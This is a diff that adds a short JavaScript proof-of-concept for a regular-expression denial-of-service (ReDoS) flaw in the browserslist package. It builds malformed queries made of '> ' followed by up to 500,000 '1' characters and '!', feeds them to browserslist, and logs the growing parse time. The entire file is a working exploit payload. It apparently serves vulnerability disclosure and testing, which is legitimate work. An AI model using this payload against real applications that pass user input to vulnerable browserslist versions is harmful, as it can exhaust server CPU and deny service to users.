@@ -1,0 +1,27 @@
+var browserslist = require("browserslist")
+function build_attack(n) {
+    var ret = "> "
+    for (var i = 0; i < n; i++) {
+        ret += "1"
+    }
+    return ret + "!";
+}
+
+// browserslist('> 1%')
+
+//browserslist(build_attack(500000))
+for(var i = 1; i <= 500000; i++) {
+    if (i % 1000 == 0) {
+        var time = Date.now();
+        var attack_str = build_attack(i)
+        try{
+            browserslist(attack_str);
+            var time_cost = Date.now() - time;
+            console.log("attack_str.length: " + attack_str.length + ": " + time_cost+" ms");
+            }
+        catch(e){
+        var time_cost = Date.now() - time;
+        console.log("attack_str.length: " + attack_str.length + ": " + time_cost+" ms");
+        }
+    }
+}
